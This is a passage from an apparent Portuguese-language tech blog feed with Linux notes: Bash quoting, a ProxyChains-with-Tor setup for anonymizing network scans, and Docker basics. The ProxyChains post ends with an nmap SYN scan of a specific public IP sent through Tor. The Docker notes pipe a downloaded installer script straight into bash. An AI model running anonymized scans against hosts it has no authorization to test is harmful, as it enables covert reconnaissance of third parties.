[user@host glob]$ echo The value of $HOME is your home directory. The value of /home/user is your home directory. [user@host glob]$ echo The value of \$HOME is your home directory. The value of $HOME is your home directory. [user@host glob]$ No exemplo anterior, proteger o cifrão de expansão fez com que o Bash o tratasse como um caractere regular e não executou a expansão de variável em $HOME .
Para proteger strings mais longas, aspas simples (&#39;) ou duplas (&amp;quot;) são usadas para delimitar strings. Elas têm efeitos ligeiramente diferentes. As aspas simples param toda a expansão do shell. As aspas duplas param a maior parte da expansão do shell.
Use aspas duplas para suprimir globbing e a expansão do shell, mas ainda permitir substituição de comandos e de variáveis.
[user@host glob]$ myhost=$(hostname -s); echo $myhost host [user@host glob]$ echo &amp;#34;***** hostname is ${myhost}*****&amp;#34; ***** hostname is host ***** [user@host glob]$ Use aspas simples para interpretar todo o texto literalmente.
[user@host glob]$ echo &amp;#34;Will variable $myhostevaluate to $(hostname -s)?&amp;#34; Will variable host evaluate to host? [user@host glob]$ echo &amp;#39;Will variable $myhost evaluate to $(hostname -s)?&amp;#39; Will variable $myhost evaluate to $(hostname -s)? [user@host glob]$ Neste capítulo, você aprendeu que:
Os arquivos em um sistema Linux são organizados em uma única árvore de diretório invertida, conhecida como hierarquia do sistema de arquivos.
Os caminhos absolutos começam com um / e especificam a localização de um arquivo na hierarquia do sistema de arquivos.
Os caminhos relativos não começam com um / e especificam a localização de um arquivo em relação ao diretório de trabalho atual.
Cinco comandos principais são usados para gerenciar arquivos: mkdir , rmdir , cp , mv e rm .
Os links físicos e os links simbólicos são maneiras diferentes de ter vários nomes de arquivos apontando para os mesmos dados.
O shell Bash fornece recursos de correspondência, expansão e substituição de padrões para ajudar você a executar comandos de maneira eficiente.
Capítulo 4. Ajuda no Red Hat Enterprise Linux ]]></content:encoded>
    </item>
    <item>
      <title>Proxychain</title>
      <link>/posts/proxychain/</link>
      <pubDate>Wed, 03 Feb 2021 14:49:14 UT</pubDate>
      <guid>/posts/proxychain/</guid>
      <description>O ProxyChains é um programa que trabalha em base UNIX, que conecta funções relacionadas à rede em programas vinculados dinamicamente por meio de uma DLL pré-carregada e redireciona as conexões por meio de proxies SOCKS4 e SOCKS5 ou HTTP.
Ao invés do Proxychains realizar o roteamento para uma lista específica de proxys, podemos usar o Tor Router e redirecionar as requisições diretamente para a porta do Tor. Ou seja, iremos realizar varreduras diretamente pela Tor.</description>
      <content:encoded><![CDATA[O ProxyChains é um programa que trabalha em base UNIX, que conecta funções relacionadas à rede em programas vinculados dinamicamente por meio de uma DLL pré-carregada e redireciona as conexões por meio de proxies SOCKS4 e SOCKS5 ou HTTP.
Ao invés do Proxychains realizar o roteamento para uma lista específica de proxys, podemos usar o Tor Router e redirecionar as requisições diretamente para a porta do Tor. Ou seja, iremos realizar varreduras diretamente pela Tor.
$ sudo apt-get install proxychains $ sudo apt-get install tor Dentro do arquivo de config do proxychains:
root@kali:~#: nano /etc/proxychains.conf Comentar a linha &amp;ldquo;strict_chain&amp;rdquo;
Descomentar a linha &amp;ldquo;dynamic_chain&amp;rdquo;
Explicação rápida sobre eles:
Strict Chain
Strict Chain é a opção padrão em proxychains. Nesta opção, todas as conexões passam pelos proxies na ordem listada no arquivo de configuração. Strict Chain é muito útil quando você deseja sua localização e sabe que os proxies selecionados estão funcionando bem. Para usar Strict Chain, é necessário descomentar “strict_chain” no arquivo de configuração.
Dynamic Chain funciona da mesma maneira que uma Strict Chain, é usado todos os proxies que estão no arquivo de configuração, mas é ignorado ou exclui os proxies da cadeia que está morta ou não está funcionando no momento. Para usar uma Dynamic Chain, remova o comentário de “Dynamic_Chain” e comente “random_chain” e “strict_chain” no arquivo de configuração.
Random Chain significa aleatoriedade, o que significa que todas as conexões passam por um proxy listado no seu arquivo de configuração, mas aleatoriamente, ninguém adivinha quais proxies são os próximos. Para usar Random Chain, é necessário descomentar “random_chain” e comentar “dynamic chain” e “strict_chain” no arquivo de configuração.
Se você estiver usando o random_chain, descomente a linha “chain_len”, que permite o encadeamento dinâmico. Ele conecta um número de endereços IP na cadeia que são gerados aleatoriamente a partir da sua lista de proxies.
Por padrão vem selecionado Strict Chain, por isso comentamos strict_chain e descomentamos dynamic_chain para que o proxychains trabalhe de forma dinamica.
E agora no final deste mesmo arquivo, vamos adicionar a linha:
socks5 127.0.0.1 9050
Inicializando o serviço do tor root@kali:~#: service tor start root@kali:~#: service tor status Testando a Conexão Abra o Firefox ou Iceweasel e acesse a URL http://www.meuip.com.br/ para pegar o seu IP atual
root@kali:~#: proxychains firefox Agora acesse o &amp;lsquo;utrace&amp;rsquo; e coloque o IP do seu Proxy para saber a localização do servidor que você está utilizando como Gateway em http://en.utrace.de/
Se estiver tudo certo, e ele te mostrar a origem do server, está pronto!
Agora quando for realizar alguma varredura é só executar o comando com o proxychains na frente, utilizando o terminal digite proxychains &#43; [ aplicação ]. O proxychains para tunelar o seu tráfego em qualquer aplicação.
Realizando uma varredura via Proxychains root@kali:~#: proxychains nmap -sC -sS 177.126.175.230 ]]></content:encoded>
    </item>
    <item>
      <title>Docker</title>
      <link>/posts/docker/</link>
      <pubDate>Thu, 08 Oct 2020 14:10:44 UT</pubDate>
      <guid>/posts/docker/</guid>
      <description>Aprendizado baseado no curso do Linuxtips, do Jefferson. Apenas para conhecimento sem fins lucrativos postei aqui para o meu aprendizado pessoal.
Quando falamos de container, estamos falando de isolamento. Esse container está sendo executado dentro de um servidor, este fica completamente isolado da maquina. E dentro deste cercado eu tenho processos locais do container. Claro consigo ver os processos do meu host local, o servidor fisico que está rodando este container.</description>
      <content:encoded><![CDATA[Aprendizado baseado no curso do Linuxtips, do Jefferson. Apenas para conhecimento sem fins lucrativos postei aqui para o meu aprendizado pessoal.
Quando falamos de container, estamos falando de isolamento. Esse container está sendo executado dentro de um servidor, este fica completamente isolado da maquina. E dentro deste cercado eu tenho processos locais do container. Claro consigo ver os processos do meu host local, o servidor fisico que está rodando este container.
Duas formas de isolamento, lógica e física.
Lógica (namespaces): redes, usuários, processos Física (Cgroups): CPU, memoria, disco.
#O que é o Docker?
Todos as imagens em camadas são read-only exceto a primeira camada ou seja a ultima é alterada. Se eu tenho 5 Containers de 500mb rodando, não será 5GB de espaço alocado no disco do servidor. Continuará sendo 500MB, pois ele usa a mesma imagem em todas as camadas.
O módulo do kernel Linux é o responsável por criar rotas, redirects e boa parte da tarefa de roteamento de pacotes para o Docker é o Netfilter
O módulo do kernel Linux é o responsável pelo isolamento de recursos como CPU e memória é o Cgroups
O módulo do kernel Linux é o responsável pelo isolamento de processos, é o namespaces
Instalando o Docker Comandos Utilizados:
curl -fsSL https://get.docker.com/ | bash docker version docker container ls a versão paga do Docker é a versão Docker EE (enterprise)
Mas vamos utilizar a versão CE, versão gratuita.
osboxes@osboxes:~$ docker version Client: Docker Engine - Community Version: 19.03.13 API version: 1.40 Go version: go1.13.15 Git commit: 4484c46d9d Built: Wed Sep 16 17:02:52 2020 OS/Arch: linux/amd64 Experimental: false Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.40/version: dial unix /var/run/docker.sock: connect: permission denied #Executando e administrando containers Docker
A primeira coisa a se fazer é o famoso hello-word
Algo como:
#$ docker container run hello-world
root@osboxes:~# docker container run hello-world Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &amp;#34;hello-world&amp;#34; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/ Para visualizar todos os containers que estão em execução, parados ou mortos, eu utilizo o comando:
#$ docker container ls -a
root@osboxes:~# docker container ls -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fc4253022db8 hello-world &amp;#34;/hello&amp;#34; 36 seconds ago Exited (0) 34 seconds ago reverent_neumann 106fbfd9aba4 hello-world &amp;#34;/hello&amp;#34; 8 minutes ago Exited (0) 8 minutes ago hungry_kapitsa Outra coisa interessante é usar o comando -ti para cair dentro do container que acabou de subir, ou seja eu quero um terminal com interatividade, no caso seria algo como:
root@osboxes:~# docker container run -ti ubuntu Unable to find image &amp;#39;ubuntu:latest&amp;#39; locally latest: Pulling from library/ubuntu d72e567cc804: Pull complete 0f3630e5ff08: Pull complete b6a83d81d1f4: Pull complete Digest: sha256:bc2f7250f69267c9c6b66d7b6a81a54d3878bb85f1ebb5f951c896d13e6ba537 Status: Downloaded newer image for ubuntu:latest root@2fd8c26be92e:/# Perceba que já está dentro do ubuntu que subiu, vamos ver os processos dele agora:
root@2fd8c26be92e:/# ps -ef UID PID PPID C STIME TTY TIME CMD root 1 0 0 17:15 pts/0 00:00:00 /bin/bash root 8 1 0 17:17 pts/0 00:00:00 ps -ef Se eu der um CTRL&#43;D eu saiu do container criado e ele morre.
Todo container tem um entrypoint, neste caso é o próprio bash, então quando saimos dele, ele é finalizado também.
root@osboxes:~# docker container run -ti centos Unable to find image &amp;#39;centos:latest&amp;#39; locally latest: Pulling from library/centos 3c72a8ed6814: Pull complete Digest: sha256:76d24f3ba3317fa945743bb3746fbaf3a0b752f10b10376960de01da70685fbd Status: Downloaded newer image for centos:latest [root@ca53ed399c0d /]#  Agora subi um CentOS, e já estou dentro dele.
[root@ca53ed399c0d /]# cat /etc/redhat-release  CentOS Linux release 8.2.2004 (Core) Se eu quero sair do container mas sem matar o container, eu digito ctrl&#43;p&#43;q quando eu volto para o meu host, posso visualizar que ela ainda está rodando.
root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 2 minutes ago Up 2 minutes pensive_turing root@osboxes:~# Como faço para voltar, agora utilizo o comando docker container attach &#43; [CONTAINER ID]
#$docker container attach ca53ed399c0d
root@osboxes:~# docker container attach ca53ed399c0d [root@ca53ed399c0d /]# cat /etc/redhat-release  CentOS Linux release 8.2.2004 (Core) Agora se eu subir um container do nginx por exemplo, nunca use a flag -ti vai parecer que está travado, acontece que você pediu para ele criar o container do nginx com interatividade, mas acontece que ele vai tentar abrir uma console, só que o entrypoint do nginx não é o bash, é o próprio processo.
Todo processo tem que estar em execução em primeiro plano, em foreign ground.
Mesmo se você attachar o nginx para tentar acessa-lo ficara parecendo que esta travando, novamente, o nginx está rodando em primeiro plano, se você entrar nele e sair, vai matar o container dele.
Ou seja neste caso não pode estar rodando como daemon.
Neste caso não vou utilizar ele com o -ti mas sim como -d, para rodar como daemon e não com interatividade.
$ docker container run nginx Primeiro eu rodo o run sem a flag -d para ele baixar o container pra mim localmente. Ai então rodo com a flag para ele deixar o processo do nginx como daemon.
$ docker container run -d nginx root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.…&amp;#34; About a minute ago Up About a minute 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 34 hours ago Up 34 hours pensive_turing Agora tenho o CentOS e o Nginx rodando.
Para que eu possa acessar esse container do nginx, visto que o entrypoint dele é o próprio processo, eu executo o comando exec
O comando exec me permite rodar comandos no container e me trás os resultados em tela, neste caso posso executar comandos como &amp;ldquo;ls, cat&amp;rdquo; normalmente.
root@osboxes:~# docker container exec -ti fecca31902c0 ls bin dev	docker-entrypoint.sh home lib64 mnt proc run srv tmp var boot docker-entrypoint.d etc	lib media opt root sbin sys usr Para ficar melhor, posso executar o bash diretamente.
root@osboxes:~# docker container exec -ti fecca31902c0 bash root@fecca31902c0:/# cat /etc/issue Debian GNU/Linux 10 \n \l Posso ver até mesmo que o nginx está configurado com a página de boas vindas certinho.
root@fecca31902c0:/usr/share/nginx# curl localhost &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Welcome to nginx!&amp;lt;/title&amp;gt; &amp;lt;style&amp;gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } &amp;lt;/style&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h1&amp;gt;Welcome to nginx!&amp;lt;/h1&amp;gt; &amp;lt;p&amp;gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.&amp;lt;/p&amp;gt; &amp;lt;p&amp;gt;For online documentation and support please refer to &amp;lt;a href=&amp;#34;http://nginx.org/&amp;#34;&amp;gt;nginx.org&amp;lt;/a&amp;gt;.&amp;lt;br/&amp;gt; Commercial support is available at &amp;lt;a href=&amp;#34;http://nginx.com/&amp;#34;&amp;gt;nginx.com&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt; &amp;lt;p&amp;gt;&amp;lt;em&amp;gt;Thank you for using nginx.&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Se eu der um CTRL&#43;D para sair do container, ele não vai matar o container por que o processo principal não era o bash, mas sim o daemon que rodei lá atrás.
root@fecca31902c0:/usr/share/nginx# exit root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.…&amp;#34; 21 minutes ago Up 21 minutes 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 34 hours ago Up 34 hours pensive_turing Rodar como daemon é não rodar este cara em primeiro plano, eu coloco -d nos casos que não quero ter interatividade, só quero que a aplicação rode.
E o comando stop eu paro os containers criados.
root@osboxes:~# docker container stop fecca31902c0 fecca31902c0 root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 34 hours ago Up 34 hours pensive_turing root@osboxes:~# docker container stop ca53ed399c0d ca53ed399c0d root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES root@osboxes:~# Assim como também posso startar novamente
root@osboxes:~# docker container start fecca31902c0 fecca31902c0 root@osboxes:~# docker container start ca53ed399c0d ca53ed399c0d root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.…&amp;#34; 37 minutes ago Up 11 seconds 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 34 hours ago Up 3 seconds pensive_turing E também tenho o restart do container, caso precise.
root@osboxes:~# docker container restart fecca31902c0 fecca31902c0 O comando insepect vai trazer os detalhes daquele container.
root@osboxes:~# docker container inspect fecca31902c0 [ { &amp;#34;Id&amp;#34;: &amp;#34;fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e&amp;#34;, &amp;#34;Created&amp;#34;: &amp;#34;2020-10-10T03:11:02.088105653Z&amp;#34;, &amp;#34;Path&amp;#34;: &amp;#34;/docker-entrypoint.sh&amp;#34;, &amp;#34;Args&amp;#34;: [ &amp;#34;nginx&amp;#34;, &amp;#34;-g&amp;#34;, &amp;#34;daemon off;&amp;#34; ], &amp;#34;State&amp;#34;: { &amp;#34;Status&amp;#34;: &amp;#34;running&amp;#34;, &amp;#34;Running&amp;#34;: true, &amp;#34;Paused&amp;#34;: false, &amp;#34;Restarting&amp;#34;: false, &amp;#34;OOMKilled&amp;#34;: false, &amp;#34;Dead&amp;#34;: false, &amp;#34;Pid&amp;#34;: 83380, &amp;#34;ExitCode&amp;#34;: 0, &amp;#34;Error&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;StartedAt&amp;#34;: &amp;#34;2020-10-10T03:49:45.95038292Z&amp;#34;, &amp;#34;FinishedAt&amp;#34;: &amp;#34;2020-10-10T03:49:45.218821799Z&amp;#34; }, &amp;#34;Image&amp;#34;: &amp;#34;sha256:992e3b7be0465856d44bed9b3d5596267205a4cfaec4241439be42f77b3539a3&amp;#34;, &amp;#34;ResolvConfPath&amp;#34;: &amp;#34;/var/lib/docker/containers/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e/resolv.conf&amp;#34;, &amp;#34;HostnamePath&amp;#34;: &amp;#34;/var/lib/docker/containers/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e/hostname&amp;#34;, &amp;#34;HostsPath&amp;#34;: &amp;#34;/var/lib/docker/containers/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e/hosts&amp;#34;, &amp;#34;LogPath&amp;#34;: &amp;#34;/var/lib/docker/containers/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e-json.log&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;/affectionate_dijkstra&amp;#34;, &amp;#34;RestartCount&amp;#34;: 0, &amp;#34;Driver&amp;#34;: &amp;#34;overlay2&amp;#34;, &amp;#34;Platform&amp;#34;: &amp;#34;linux&amp;#34;, &amp;#34;MountLabel&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;ProcessLabel&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;AppArmorProfile&amp;#34;: &amp;#34;docker-default&amp;#34;, &amp;#34;ExecIDs&amp;#34;: null, &amp;#34;HostConfig&amp;#34;: { &amp;#34;Binds&amp;#34;: null, &amp;#34;ContainerIDFile&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;LogConfig&amp;#34;: { &amp;#34;Type&amp;#34;: &amp;#34;json-file&amp;#34;, &amp;#34;Config&amp;#34;: {} }, &amp;#34;NetworkMode&amp;#34;: &amp;#34;default&amp;#34;, &amp;#34;PortBindings&amp;#34;: {}, &amp;#34;RestartPolicy&amp;#34;: { &amp;#34;Name&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;MaximumRetryCount&amp;#34;: 0 }, &amp;#34;AutoRemove&amp;#34;: false, &amp;#34;VolumeDriver&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;VolumesFrom&amp;#34;: null, &amp;#34;CapAdd&amp;#34;: null, &amp;#34;CapDrop&amp;#34;: null, &amp;#34;Capabilities&amp;#34;: null, &amp;#34;Dns&amp;#34;: [], &amp;#34;DnsOptions&amp;#34;: [], &amp;#34;DnsSearch&amp;#34;: [], &amp;#34;ExtraHosts&amp;#34;: null, &amp;#34;GroupAdd&amp;#34;: null, &amp;#34;IpcMode&amp;#34;: &amp;#34;private&amp;#34;, &amp;#34;Cgroup&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;Links&amp;#34;: null, &amp;#34;OomScoreAdj&amp;#34;: 0, &amp;#34;PidMode&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;Privileged&amp;#34;: false, &amp;#34;PublishAllPorts&amp;#34;: false, &amp;#34;ReadonlyRootfs&amp;#34;: false, &amp;#34;SecurityOpt&amp;#34;: null, &amp;#34;UTSMode&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;UsernsMode&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;ShmSize&amp;#34;: 67108864, &amp;#34;Runtime&amp;#34;: &amp;#34;runc&amp;#34;, &amp;#34;ConsoleSize&amp;#34;: [ 0, 0 ], &amp;#34;Isolation&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;CpuShares&amp;#34;: 0, &amp;#34;Memory&amp;#34;: 0, &amp;#34;NanoCpus&amp;#34;: 0, &amp;#34;CgroupParent&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;BlkioWeight&amp;#34;: 0, &amp;#34;BlkioWeightDevice&amp;#34;: [], &amp;#34;BlkioDeviceReadBps&amp;#34;: null, &amp;#34;BlkioDeviceWriteBps&amp;#34;: null, &amp;#34;BlkioDeviceReadIOps&amp;#34;: null, &amp;#34;BlkioDeviceWriteIOps&amp;#34;: null, &amp;#34;CpuPeriod&amp;#34;: 0, &amp;#34;CpuQuota&amp;#34;: 0, &amp;#34;CpuRealtimePeriod&amp;#34;: 0, &amp;#34;CpuRealtimeRuntime&amp;#34;: 0, &amp;#34;CpusetCpus&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;CpusetMems&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;Devices&amp;#34;: [], &amp;#34;DeviceCgroupRules&amp;#34;: null, &amp;#34;DeviceRequests&amp;#34;: null, &amp;#34;KernelMemory&amp;#34;: 0, &amp;#34;KernelMemoryTCP&amp;#34;: 0, &amp;#34;MemoryReservation&amp;#34;: 0, &amp;#34;MemorySwap&amp;#34;: 0, &amp;#34;MemorySwappiness&amp;#34;: null, &amp;#34;OomKillDisable&amp;#34;: false, &amp;#34;PidsLimit&amp;#34;: null, &amp;#34;Ulimits&amp;#34;: null, &amp;#34;CpuCount&amp;#34;: 0, &amp;#34;CpuPercent&amp;#34;: 0, &amp;#34;IOMaximumIOps&amp;#34;: 0, &amp;#34;IOMaximumBandwidth&amp;#34;: 0, &amp;#34;MaskedPaths&amp;#34;: [ &amp;#34;/proc/asound&amp;#34;, &amp;#34;/proc/acpi&amp;#34;, &amp;#34;/proc/kcore&amp;#34;, &amp;#34;/proc/keys&amp;#34;, &amp;#34;/proc/latency_stats&amp;#34;, &amp;#34;/proc/timer_list&amp;#34;, &amp;#34;/proc/timer_stats&amp;#34;, &amp;#34;/proc/sched_debug&amp;#34;, &amp;#34;/proc/scsi&amp;#34;, &amp;#34;/sys/firmware&amp;#34; ], &amp;#34;ReadonlyPaths&amp;#34;: [ &amp;#34;/proc/bus&amp;#34;, &amp;#34;/proc/fs&amp;#34;, &amp;#34;/proc/irq&amp;#34;, &amp;#34;/proc/sys&amp;#34;, &amp;#34;/proc/sysrq-trigger&amp;#34; ] }, &amp;#34;GraphDriver&amp;#34;: { &amp;#34;Data&amp;#34;: { &amp;#34;LowerDir&amp;#34;: &amp;#34;/var/lib/docker/overlay2/26828e39601076b546dccc85c380c95cf5cc0b522e323146d1b95d11ea7937f0-init/diff:/var/lib/docker/overlay2/84650e899c555dc002159c3c23c29e89e034100f74fd3cbb06e780ad664becf9/diff:/var/lib/docker/overlay2/1e436d1da6e23864fe43e1edc99b400aedf747d7c40c233334adc8dc8d605863/diff:/var/lib/docker/overlay2/ea346940afd1708c365a570cc67b1736ff34fe3abee91a19cd79ce0456dcfc80/diff:/var/lib/docker/overlay2/7a5860acc38166730e81c14f29786ca662e46d9a3470b89db74bf2c6f22373e9/diff:/var/lib/docker/overlay2/5fe8bdb9845162cbb357ac3c5d2a24ebedacca1d689eb69c1658d408fb5896db/diff&amp;#34;, &amp;#34;MergedDir&amp;#34;: &amp;#34;/var/lib/docker/overlay2/26828e39601076b546dccc85c380c95cf5cc0b522e323146d1b95d11ea7937f0/merged&amp;#34;, &amp;#34;UpperDir&amp;#34;: &amp;#34;/var/lib/docker/overlay2/26828e39601076b546dccc85c380c95cf5cc0b522e323146d1b95d11ea7937f0/diff&amp;#34;, &amp;#34;WorkDir&amp;#34;: &amp;#34;/var/lib/docker/overlay2/26828e39601076b546dccc85c380c95cf5cc0b522e323146d1b95d11ea7937f0/work&amp;#34; }, &amp;#34;Name&amp;#34;: &amp;#34;overlay2&amp;#34; }, &amp;#34;Mounts&amp;#34;: [], &amp;#34;Config&amp;#34;: { &amp;#34;Hostname&amp;#34;: &amp;#34;fecca31902c0&amp;#34;, &amp;#34;Domainname&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;User&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;AttachStdin&amp;#34;: false, &amp;#34;AttachStdout&amp;#34;: false, &amp;#34;AttachStderr&amp;#34;: false, &amp;#34;ExposedPorts&amp;#34;: { &amp;#34;80/tcp&amp;#34;: {} }, &amp;#34;Tty&amp;#34;: false, &amp;#34;OpenStdin&amp;#34;: false, &amp;#34;StdinOnce&amp;#34;: false, &amp;#34;Env&amp;#34;: [ &amp;#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;#34;, &amp;#34;NGINX_VERSION=1.19.3&amp;#34;, &amp;#34;NJS_VERSION=0.4.4&amp;#34;, &amp;#34;PKG_RELEASE=1~buster&amp;#34; ], &amp;#34;Cmd&amp;#34;: [ &amp;#34;nginx&amp;#34;, &amp;#34;-g&amp;#34;, &amp;#34;daemon off;&amp;#34; ], &amp;#34;Image&amp;#34;: &amp;#34;nginx&amp;#34;, &amp;#34;Volumes&amp;#34;: null, &amp;#34;WorkingDir&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;Entrypoint&amp;#34;: [ &amp;#34;/docker-entrypoint.sh&amp;#34; ], &amp;#34;OnBuild&amp;#34;: null, &amp;#34;Labels&amp;#34;: { &amp;#34;maintainer&amp;#34;: &amp;#34;NGINX Docker Maintainers &amp;lt;docker-maint@nginx.com&amp;gt;&amp;#34; }, &amp;#34;StopSignal&amp;#34;: &amp;#34;SIGTERM&amp;#34; }, &amp;#34;NetworkSettings&amp;#34;: { &amp;#34;Bridge&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;SandboxID&amp;#34;: &amp;#34;025bdf57c2c369552c5538135b7e5007d4491807375357f7bce90a802291915a&amp;#34;, &amp;#34;HairpinMode&amp;#34;: false, &amp;#34;LinkLocalIPv6Address&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;LinkLocalIPv6PrefixLen&amp;#34;: 0, &amp;#34;Ports&amp;#34;: { &amp;#34;80/tcp&amp;#34;: null }, &amp;#34;SandboxKey&amp;#34;: &amp;#34;/var/run/docker/netns/025bdf57c2c3&amp;#34;, &amp;#34;SecondaryIPAddresses&amp;#34;: null, &amp;#34;SecondaryIPv6Addresses&amp;#34;: null, &amp;#34;EndpointID&amp;#34;: &amp;#34;61173c80ab6b1c9c01b93c48df85a8dfb3612d644d38a084e3abad2a7e24f0d0&amp;#34;, &amp;#34;Gateway&amp;#34;: &amp;#34;172.17.0.1&amp;#34;, &amp;#34;GlobalIPv6Address&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;GlobalIPv6PrefixLen&amp;#34;: 0, &amp;#34;IPAddress&amp;#34;: &amp;#34;172.17.0.2&amp;#34;, &amp;#34;IPPrefixLen&amp;#34;: 16, &amp;#34;IPv6Gateway&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;MacAddress&amp;#34;: &amp;#34;02:42:ac:11:00:02&amp;#34;, &amp;#34;Networks&amp;#34;: { &amp;#34;bridge&amp;#34;: { &amp;#34;IPAMConfig&amp;#34;: null, &amp;#34;Links&amp;#34;: null, &amp;#34;Aliases&amp;#34;: null, &amp;#34;NetworkID&amp;#34;: &amp;#34;6bf2ac8e47d6de141905be78499c34f36b89ace5586c89a38be3090a8881365c&amp;#34;, &amp;#34;EndpointID&amp;#34;: &amp;#34;61173c80ab6b1c9c01b93c48df85a8dfb3612d644d38a084e3abad2a7e24f0d0&amp;#34;, &amp;#34;Gateway&amp;#34;: &amp;#34;172.17.0.1&amp;#34;, &amp;#34;IPAddress&amp;#34;: &amp;#34;172.17.0.2&amp;#34;, &amp;#34;IPPrefixLen&amp;#34;: 16, &amp;#34;IPv6Gateway&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;GlobalIPv6Address&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;GlobalIPv6PrefixLen&amp;#34;: 0, &amp;#34;MacAddress&amp;#34;: &amp;#34;02:42:ac:11:00:02&amp;#34;, &amp;#34;DriverOpts&amp;#34;: null } } } } ] root@osboxes:~# Posso também pausar um container com o comando pause
root@osboxes:~# docker container pause fecca31902c0 fecca31902c0 root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.…&amp;#34; 43 minutes ago Up 5 minutes (Paused) 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 35 hours ago Up 6 minutes pensive_turing root@osboxes:~# docker container unpause fecca31902c0 fecca31902c0 root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.…&amp;#34; 43 minutes ago Up 5 minutes 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 35 hours ago Up 6 minutes pensive_turing Para que eu possa ver os logs deste container, utilizo o comando logs seguido da flag -f e ID para ficar monitorando.
root@osboxes:~# docker container logs -f fecca31902c0 /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration /docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/ /docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh 10-listen-on-ipv6-by-default.sh: Getting the checksum of /etc/nginx/conf.d/default.conf 10-listen-on-ipv6-by-default.sh: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf /docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh /docker-entrypoint.sh: Configuration complete; ready for start up 127.0.0.1 - - [10/Oct/2020:03:26:52 &#43;0000] &amp;#34;GET / HTTP/1.1&amp;#34; 200 612 &amp;#34;-&amp;#34; &amp;#34;curl/7.64.0&amp;#34; &amp;#34;-&amp;#34; /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration Para remover um container, basta utilizar o comando rm, porém se o mesmo estiver em execução, ele não vai deixar. Para isso basta fazer um rm -f
